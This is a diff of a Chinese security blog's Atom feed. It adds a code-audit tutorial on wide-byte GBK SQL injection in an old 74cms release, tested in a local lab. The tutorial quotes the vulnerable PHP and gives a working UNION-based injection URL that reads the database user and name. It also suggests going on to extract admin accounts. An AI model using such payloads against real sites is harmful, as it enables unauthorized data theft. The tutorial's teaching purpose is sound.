@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.cnbraid.com/"/>
-  <updated>2016-02-19T09:55:35.551Z</updated>
+  <updated>2016-02-29T01:19:00.232Z</updated>
   <id>http://www.cnbraid.com/</id>
   
   <author>
@@ -16,11 +16,168 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 4.全局防护Bypass之宽字节注入</title>
+    <link href="http://www.cnbraid.com/2016/02/28/sql4/"/>
+    <id>http://www.cnbraid.com/2016/02/28/sql4/</id>
+    <published>2016-02-28T02:35:00.000Z</published>
+    <updated>2016-02-29T01:19:00.232Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;首先我们了解下宽字节注入，宽字节注入源于程序员设置MySQL连接时错误配置为：set character_set_client=gbk，这样配置会引发编码转换从而导致的注入漏洞。具体原理如下：&lt;br&gt;1.正常情况下当GPC开启或使用addslashes函数过滤GET或POST提交的参数时，黑客使用的单引号 ‘ 就会被转义为: \’；&lt;br&gt;2.但如果存在宽字节注入，我们输入%df%27时首先经过上面提到的单引号转义变成了%df%5c%27（%5c是反斜杠\），之后在数据库查询前由于使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成了汉字“運”（注：GBK的汉字编码范围见附录），而单引号逃逸了出来，从而造成了注入漏洞。&lt;br&gt;现在基本上都会将mysql的连接配置为“set character_set_client=binary”来解决这个问题，所以这篇文章将介绍出现在php中因为字符编码导致的注入问题。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;思路来源于FreeBuf：&lt;a href=&quot;http://www.freebuf.com/articles/web/31537.html&quot; target=&quot;_blank&quot;&gt;http://www.freebuf.com/articles/web/31537.html&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;漏洞来源于乌云：&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-063219&quot; target=&quot;_blank&quot;&gt;http://www.wooyun.org/bugs/wooyun-2014-063219&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x02_环境搭建&quot;&gt;0x02 环境搭建&lt;/h2&gt;&lt;p&gt;看背景我们使用了低版本的74cms程序，版本为3.4（20140310）&lt;br&gt;①源码网上可以搜到，我打包了一份：&lt;a href=&quot;http://pan.baidu.com/s/1c1mLCru&quot; title=&quot;74cmsV3.4(20140310).zip&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1c1mLCru&lt;/a&gt;&lt;br&gt;②解压到www的74cms(20140310)目录下，浏览器访问&lt;a href=&quot;http://localhost/74cms(20140310&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://localhost/74cms(20140310)&lt;/a&gt;)，然后按照提示一步步安装即可，安装遇到问题请自行百度或谷歌，成功后访问如下图：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql3_02.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x03_漏洞分析&quot;&gt;0x03 漏洞分析&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Part1:源码结构&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;源码的结构比较清晰，应该是审计过最清晰的结构了，主要有下面三块内容：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql3_03.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;index.php引入了common.inc.php文件，我们跟进common.inc.php，发现了处理gpc的函数:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;keyword&quot;&gt;empty&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;))
+{
+&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;  = addslashes_deep(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;);
+}
+&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;keyword&quot;&gt;empty&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_POST&lt;/span&gt;))
+{
+&lt;span class=&quot;variable&quot;&gt;$_POST&lt;/span&gt; = addslashes_deep(&lt;span class=&quot;variable&quot;&gt;$_POST&lt;/span&gt;);
+}
+&lt;span class=&quot;variable&quot;&gt;$_COOKIE&lt;/span&gt;   = addslashes_deep(&lt;span class=&quot;variable&quot;&gt;$_COOKIE&lt;/span&gt;);
+&lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;  = addslashes_deep(&lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到，服务端处理GET和POST请求的变量时都会做addslashes处理。&lt;br&gt;而且74cms为了防止宽字节注入，将MySQL连接设置为二进制读取，配置在/include/mysql.class.php中：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; connect(&lt;span class=&quot;variable&quot;&gt;$dbhost&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$dbuser&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$dbpw&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$dbname&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$dbcharset&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&#39;gbk&#39;&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$connect&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;){
+    &lt;span class=&quot;variable&quot;&gt;$func&lt;/span&gt; = empty(&lt;span class=&quot;variable&quot;&gt;$connect&lt;/span&gt;) ? &lt;span class=&quot;string&quot;&gt;&#39;mysql_pconnect&#39;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&#39;mysql_connect&#39;&lt;/span&gt;;
+    if(!&lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;linkid = @&lt;span class=&quot;variable&quot;&gt;$func&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$dbhost&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$dbuser&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$dbpw&lt;/span&gt;, true)){
+        &lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;dbshow(&lt;span class=&quot;string&quot;&gt;&#39;Can not connect to Mysql!&#39;&lt;/span&gt;);
+    } else {
+        if(&lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;dbversion() &amp;gt; &lt;span class=&quot;string&quot;&gt;&#39;4.1&#39;&lt;/span&gt;){
+            mysql_query( &lt;span class=&quot;string&quot;&gt;&quot;SET NAMES gbk&quot;&lt;/span&gt;);
+            if(&lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;dbversion() &amp;gt; &lt;span class=&quot;string&quot;&gt;&#39;5.0.1&#39;&lt;/span&gt;){
+                mysql_query(&lt;span class=&quot;string&quot;&gt;&quot;SET sql_mode = &#39;&#39;&quot;&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;linkid);
+                //character_set_client=binary即二进制方式
+                mysql_query(&lt;span class=&quot;string&quot;&gt;&quot;SET character_set_connection=&quot;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$dbcharset&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;, character_set_results=&quot;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$dbcharset&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;, character_set_client=binary&quot;&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;linkid);
+            }
+        }
+    }
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来看看php中iconv函数的使用会造成什么样的后果。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Part2:审计过程&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;注入一分析：&lt;br&gt;1.在/plus/ajax_user.php注册处：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;elseif (&lt;span class=&quot;variable&quot;&gt;$act&lt;/span&gt;==&lt;span class=&quot;string&quot;&gt;&#39;do_reg&#39;&lt;/span&gt;)
+{
+&lt;span class=&quot;variable&quot;&gt;$captcha&lt;/span&gt;=get_cache(&lt;span class=&quot;string&quot;&gt;&#39;captcha&#39;&lt;/span&gt;);
+if (&lt;span class=&quot;variable&quot;&gt;$captcha&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;verify_userreg&#39;&lt;/span&gt;]==&lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt;)
+{
+    &lt;span class=&quot;variable&quot;&gt;$postcaptcha&lt;/span&gt;=$_POST[&lt;span class=&quot;string&quot;&gt;&#39;postcaptcha&#39;&lt;/span&gt;];
+    if (&lt;span class=&quot;variable&quot;&gt;$captcha&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;captcha_lang&#39;&lt;/span&gt;]==&lt;span class=&quot;string&quot;&gt;&quot;cn&quot;&lt;/span&gt; &amp;amp;&amp;amp; strcasecmp(QISHI_DBCHARSET,&lt;span class=&quot;string&quot;&gt;&quot;utf8&quot;&lt;/span&gt;)!=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)
+    {
+    &lt;span class=&quot;variable&quot;&gt;$postcaptcha&lt;/span&gt;=iconv(&lt;span class=&quot;string&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;,QISHI_DBCHARSET,&lt;span class=&quot;variable&quot;&gt;$postcaptcha&lt;/span&gt;);
+    }
+    if (empty(&lt;span class=&quot;variable&quot;&gt;$postcaptcha&lt;/span&gt;) || empty($_SESSION[&lt;span class=&quot;string&quot;&gt;&#39;imageCaptcha_content&#39;&lt;/span&gt;]) || strcasecmp($_SESSION[&lt;span class=&quot;string&quot;&gt;&#39;imageCaptcha_content&#39;&lt;/span&gt;],&lt;span class=&quot;variable&quot;&gt;$postcaptcha&lt;/span&gt;)!=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)
+    {
+    exit(&lt;span class=&quot;string&quot;&gt;&quot;err&quot;&lt;/span&gt;);
+    }
+}
+require_once(QISHI_ROOT_PATH.&lt;span class=&quot;string&quot;&gt;&#39;include/fun_user.php&#39;&lt;/span&gt;);
+&lt;span class=&quot;variable&quot;&gt;$username&lt;/span&gt; = isset($_POST[&lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;])?trim($_POST[&lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;]):exit(&lt;span class=&quot;string&quot;&gt;&quot;err&quot;&lt;/span&gt;);
+&lt;span class=&quot;variable&quot;&gt;$password&lt;/span&gt; = isset($_POST[&lt;span class=&quot;string&quot;&gt;&#39;password&#39;&lt;/span&gt;])?trim($_POST[&lt;span class=&quot;string&quot;&gt;&#39;password&#39;&lt;/span&gt;]):exit(&lt;span class=&quot;string&quot;&gt;&quot;err&quot;&lt;/span&gt;);
+&lt;span class=&quot;variable&quot;&gt;$member&lt;/span&gt;_type = isset($_POST[&lt;span class=&quot;string&quot;&gt;&#39;member_type&#39;&lt;/span&gt;])?intval($_POST[&lt;span class=&quot;string&quot;&gt;&#39;member_type&#39;&lt;/span&gt;]):exit(&lt;span class=&quot;string&quot;&gt;&quot;err&quot;&lt;/span&gt;);
+&lt;span class=&quot;variable&quot;&gt;$email&lt;/span&gt; = isset($_POST[&lt;span class=&quot;string&quot;&gt;&#39;email&#39;&lt;/span&gt;])?trim($_POST[&lt;span class=&quot;string&quot;&gt;&#39;email&#39;&lt;/span&gt;]):exit(&lt;span class=&quot;string&quot;&gt;&quot;err&quot;&lt;/span&gt;);
+if (strcasecmp(QISHI_DBCHARSET,&lt;span class=&quot;string&quot;&gt;&quot;utf8&quot;&lt;/span&gt;)!=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)
+{
+//对注册的名字进行utf-&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;到GBK的编码转换
+&lt;span class=&quot;variable&quot;&gt;$username&lt;/span&gt;=iconv(&lt;span class=&quot;string&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;,QISHI_DBCHARSET,&lt;span class=&quot;variable&quot;&gt;$username&lt;/span&gt;);
+&lt;span class=&quot;variable&quot;&gt;$password&lt;/span&gt;=iconv(&lt;span class=&quot;string&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;,QISHI_DBCHARSET,&lt;span class=&quot;variable&quot;&gt;$password&lt;/span&gt;);
+}
+ &lt;span class=&quot;variable&quot;&gt;$register&lt;/span&gt;=user_register(&lt;span class=&quot;variable&quot;&gt;$username&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$password&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$member&lt;/span&gt;_type,&lt;span class=&quot;variable&quot;&gt;$email&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里我们思考下“錦”这个字，它的utf-8编码是e98ca6，它的gbk编码是e55c，而上面提到过反斜杠\正好为5c。&lt;br&gt;所以如果我们将username设置为：錦’，首先经过addlashes函数或GPC对单引号转义变为：錦\’，然后这里注册时会经过icnov函数会对”錦”转化为gbk编码，最后就是：％e5％5c％5c％27。反斜杠被转义了（％5c％5c），从而单引号逃逸出来引发注入漏洞。&lt;/p&gt;
+&lt;p&gt;2.我们继续跟进$register=user_register($username,$password,$member_type,$email);&lt;br&gt;这里的user_register函数，在/include/fun_user.php里：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;//检查简历的完成程度
+//注册会员
+&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; user_register(&lt;span class=&quot;variable&quot;&gt;$username&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$password&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$member&lt;/span&gt;_type=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$email&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$uc&lt;/span&gt;_reg=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;)
+{
+global &lt;span class=&quot;variable&quot;&gt;$db&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$timestamp&lt;/span&gt;,$_CFG,&lt;span class=&quot;variable&quot;&gt;$online&lt;/span&gt;_ip,&lt;span class=&quot;variable&quot;&gt;$QS&lt;/span&gt;_pwdhash;
+&lt;span class=&quot;variable&quot;&gt;$member&lt;/span&gt;_type=intval(&lt;span class=&quot;variable&quot;&gt;$member&lt;/span&gt;_type);
+//这里是用get_user_inusername函数来判断用户名是否已经存在，我们跟进
+&lt;span class=&quot;variable&quot;&gt;$ck&lt;/span&gt;_username=get_user_inusername(&lt;span class=&quot;variable&quot;&gt;$username&lt;/span&gt;);
+&lt;span class=&quot;variable&quot;&gt;$ck&lt;/span&gt;_email=get_user_inemail(&lt;span class=&quot;variable&quot;&gt;$email&lt;/span&gt;);
+... ...
+return &lt;span class=&quot;variable&quot;&gt;$insert&lt;/span&gt;_id;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.继续跟进get_user_inusername函数，在/include/fun_user.php里：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; get_user_inusername(&lt;span class=&quot;variable&quot;&gt;$username&lt;/span&gt;)
+{
+global &lt;span class=&quot;variable&quot;&gt;$db&lt;/span&gt;;
+//带入查询，可注入～
+&lt;span class=&quot;variable&quot;&gt;$sql&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;select * from &quot;&lt;/span&gt;.table(&lt;span class=&quot;string&quot;&gt;&#39;members&#39;&lt;/span&gt;).&lt;span class=&quot;string&quot;&gt;&quot; where username = &#39;{$username}&#39; LIMIT 1&quot;&lt;/span&gt;;
+return &lt;span class=&quot;variable&quot;&gt;$db-&lt;/span&gt;&amp;gt;getone(&lt;span class=&quot;variable&quot;&gt;$sql&lt;/span&gt;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注入二分析：&lt;br&gt;在plus/ajax_street.php中：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;elseif(&lt;span class=&quot;variable&quot;&gt;$act&lt;/span&gt; == &lt;span class=&quot;string&quot;&gt;&#39;key&#39;&lt;/span&gt;)
+{
+&lt;span class=&quot;variable&quot;&gt;$key&lt;/span&gt;=trim($_GET[&lt;span class=&quot;string&quot;&gt;&#39;key&#39;&lt;/span&gt;]);
+if (!empty(&lt;span class=&quot;variable&quot;&gt;$key&lt;/span&gt;))
+{
+if (strcasecmp(QISHI_DBCHARSET,&lt;span class=&quot;string&quot;&gt;&quot;utf8&quot;&lt;/span&gt;)!=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) 
+//对参数key进行utf-&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;到GBK编码的转换
+&lt;span class=&quot;variable&quot;&gt;$key&lt;/span&gt;=iconv(&lt;span class=&quot;string&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;,QISHI_DBCHARSET,&lt;span class=&quot;variable&quot;&gt;$key&lt;/span&gt;);
+//带入查询，可以注入
+&lt;span class=&quot;variable&quot;&gt;$result&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$db-&lt;/span&gt;&amp;gt;query(&lt;span class=&quot;string&quot;&gt;&quot;select * from &quot;&lt;/span&gt;.table(&lt;span class=&quot;string&quot;&gt;&#39;category&#39;&lt;/span&gt;).&lt;span class=&quot;string&quot;&gt;&quot; where c_alias=&#39;QS_street&#39; AND c_name LIKE &#39;%{$key}%&#39; &quot;&lt;/span&gt;);
+//将查询结果输出到页面中，可回显
+while(&lt;span class=&quot;variable&quot;&gt;$row&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$db-&lt;/span&gt;&amp;gt;fetch_array(&lt;span class=&quot;variable&quot;&gt;$result&lt;/span&gt;))
+{
+    if (&lt;span class=&quot;variable&quot;&gt;$listtype&lt;/span&gt;==&lt;span class=&quot;string&quot;&gt;&quot;li&quot;&lt;/span&gt;)
+    {
+    &lt;span class=&quot;variable&quot;&gt;$htm&lt;/span&gt;.=&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;li  title=\&quot;&lt;/span&gt;{&lt;span class=&quot;variable&quot;&gt;$row&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;c_name&#39;&lt;/span&gt;]}\&lt;span class=&quot;string&quot;&gt;&quot; id=\&quot;&lt;/span&gt;{&lt;span class=&quot;variable&quot;&gt;$row&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;c_id&#39;&lt;/span&gt;]}\&lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;{$row[&#39;c_name&#39;]}&amp;lt;/li&amp;gt;&quot;&lt;/span&gt;;
+    }
+    else
+    {
+    $_GET[&lt;span class=&quot;string&quot;&gt;&#39;streetid&#39;&lt;/span&gt;]=&lt;span class=&quot;variable&quot;&gt;$row&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;c_id&#39;&lt;/span&gt;];
+    &lt;span class=&quot;variable&quot;&gt;$url&lt;/span&gt;=url_rewrite(&lt;span class=&quot;string&quot;&gt;&#39;QS_street&#39;&lt;/span&gt;,$_GET);
+    &lt;span class=&quot;variable&quot;&gt;$htm&lt;/span&gt;.=&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;li&amp;gt;&amp;lt;a href=\&quot;&lt;/span&gt;{&lt;span class=&quot;variable&quot;&gt;$url&lt;/span&gt;}\&lt;span class=&quot;string&quot;&gt;&quot; title=\&quot;&lt;/span&gt;{&lt;span class=&quot;variable&quot;&gt;$row&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;c_note&#39;&lt;/span&gt;]}\&lt;span class=&quot;string&quot;&gt;&quot; class=\&quot;&lt;/span&gt;vtip\&lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;{$row[&#39;c_name&#39;]}&amp;lt;/a&amp;gt;&amp;lt;span&amp;gt;{$row[&#39;stat_jobs&#39;]}&amp;lt;/span&amp;gt;&amp;lt;/li&amp;gt;&quot;&lt;/span&gt;;
+    };
+}
+if (empty(&lt;span class=&quot;variable&quot;&gt;$htm&lt;/span&gt;))
+{
+&lt;span class=&quot;variable&quot;&gt;$htm&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;span class=\&quot;&lt;/span&gt;noinfo\&lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;没有找到关键字： &amp;lt;span&amp;gt;{$key}&amp;lt;/span&amp;gt; 相关道路！&amp;lt;/span&amp;gt;&quot;&lt;/span&gt;;
+}
+exit(&lt;span class=&quot;variable&quot;&gt;$htm&lt;/span&gt;);
+}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里分析发现页面将查询结果回显出来，构造一些union的查询语句即可获取数据库的敏感信息。&lt;/p&gt;
+&lt;h2 id=&quot;0x04_漏洞证明&quot;&gt;0x04 漏洞证明&lt;/h2&gt;&lt;p&gt;我们使用注入二（有回显）的来做证明&lt;br&gt;发现74cms的category表有9个字段，所以构造获取数据库用户和相关信息的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/&lt;span class=&quot;number&quot;&gt;74&lt;/span&gt;cms(&lt;span class=&quot;number&quot;&gt;20140310&lt;/span&gt;)/plus/ajax_street.php?act=key&amp;amp;key=&lt;span class=&quot;decorator&quot;&gt;%E9&lt;/span&gt;&lt;span class=&quot;decorator&quot;&gt;%8C&lt;/span&gt;&lt;span class=&quot;decorator&quot;&gt;%A6&lt;/span&gt;&lt;span class=&quot;decorator&quot;&gt;%27&lt;/span&gt;&lt;span class=&quot;decorator&quot;&gt;%20union&lt;/span&gt;&lt;span class=&quot;decorator&quot;&gt;%20select&lt;/span&gt;&lt;span class=&quot;decorator&quot;&gt;%201&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,user(),&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;,database(),&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;decorator&quot;&gt;%23&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql4_01.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;查看sql语句发现查询语句里反斜杠被转移，单引号成功逃逸出来：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql4_02.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;最后，有兴趣的同学可以继续获取其它的管理员账户等相关字段的信息。&lt;/p&gt;
+&lt;p&gt;附GBK的汉字编码范围：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;汉字区包括：&lt;/strong&gt;&lt;br&gt;a. GB 2312 汉字区。即 GBK/2: B0A1-F7FE。收录 GB 2312 汉字 6763 个，按原顺序排列。&lt;br&gt;b. GB 13000.1 扩充汉字区。包括：&lt;br&gt;(1) GBK/3: 8140-A0FE。收录 GB 13000.1 中的 CJK 汉字 6080 个。&lt;br&gt;(2) GBK/4: AA40-FEA0。收录 CJK 汉字和增补的汉字 8160 个。CJK 汉字在前，按 UCS 代码大小排列；增补的汉字（包括部首和构件）在后，按《康熙字典》的页码/字位排列。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;可以看到，GBK编码中的两个字符是一个汉字，第一个字符需要大于128。&lt;/p&gt;
+&lt;p&gt;本文由HackBraid整理总结，如需转载请联系作者。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;首先我们了解下宽字节注入，宽字节注入源于程序员设置MySQL连接时错误配置为：set character_set_client=gbk，这样配置会引发编码转换从而导致的注入漏洞。具体原理如下：&lt;br&gt;1.正常情况下当GPC开启或使用addslashes函数过滤GET或POST提交的参数时，黑客使用的单引号 ‘ 就会被转义为: \’；&lt;br&gt;2.但如果存在宽字节注入，我们输入%df%27时首先经过上面提到的单引号转义变成了%df%5c%27（%5c是反斜杠\），之后在数据库查询前由于使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成了汉字“運”（注：GBK的汉字编码范围见附录），而单引号逃逸了出来，从而造成了注入漏洞。&lt;br&gt;现在基本上都会将mysql的连接配置为“set character_set_client=binary”来解决这个问题，所以这篇文章将介绍出现在php中因为字符编码导致的注入问题。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;思路来源于FreeBuf：&lt;a href=&quot;http://www.freebuf.com/articles/web/31537.html&quot; target=&quot;_blank&quot;&gt;http://www.freebuf.com/articles/web/31537.html&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;漏洞来源于乌云：&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-063219&quot; target=&quot;_blank&quot;&gt;http://www.wooyun.org/bugs/wooyun-2014-063219&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="WEB安全" scheme="http://www.cnbraid.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="PHP" scheme="http://www.cnbraid.com/tags/PHP/"/>
+    
+      <category term="SQL注入" scheme="http://www.cnbraid.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="代码审计" scheme="http://www.cnbraid.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
     <title>【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 4.全局防护Bypass之二次注入</title>
     <link href="http://www.cnbraid.com/2016/02/19/sql3/"/>
     <id>http://www.cnbraid.com/2016/02/19/sql3/</id>
     <published>2016-02-19T02:35:00.000Z</published>
-    <updated>2016-02-19T09:55:35.551Z</updated>
+    <updated>2016-02-25T01:47:15.306Z</updated>
     
     <content type="html">&lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。二次注入也是一种比较常见的注入，它涉及到入库和出库。因为有全局转义所以入库的时候：&lt;/p&gt;
 &lt;blockquote&gt;
@@ -31,7 +188,9 @@
 &lt;h2 id=&quot;0x03_漏洞分析&quot;&gt;0x03 漏洞分析&lt;/h2&gt;&lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;Part1:源码结构&lt;/strong&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;源码的结构比较清晰，应该是审计过最清晰的结构了，主要有下面三块内容：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql3_03.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;index.php引入了common.inc.php文件，我们跟进common.inc.php，发现了处理gpc的函数:&lt;/p&gt;
+&lt;p&gt;源码的结构比较清晰，应该是审计过最清晰的结构了，主要有下面三块内容：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql3_03.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;index.php引入了common.inc.php文件，我们跟进common.inc.php，发现了处理gpc的函数:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;keyword&quot;&gt;empty&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;))
 {
 &lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;  = addslashes_deep(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;);
